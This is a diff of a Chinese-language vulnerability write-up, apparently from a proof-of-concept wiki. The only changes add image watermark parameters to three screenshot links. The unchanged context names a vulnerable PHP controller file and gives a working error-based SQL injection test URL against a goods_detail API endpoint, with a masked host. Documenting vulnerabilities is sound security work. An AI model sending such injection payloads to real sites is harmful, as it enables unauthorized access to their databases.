@@ -20,7 +20,7 @@
 
 登录页面如下
 
-![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-1.png)
+![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-1.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 存在漏洞的文件为 **ApiController.class.php  **, 关键位置为
 
@@ -60,7 +60,7 @@ public function goods_detail()
 		$goods = $goods_arr[0];
 ```
 
-![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-8.png)
+![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-8.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
 
 漏洞测试为
 
@@ -68,4 +68,4 @@ public function goods_detail()
 https://xxx.xxx.xx.xxx/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(1),0x7e),1)
 ```
 
-![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-9.png)
+![]( http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/szy-9.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)
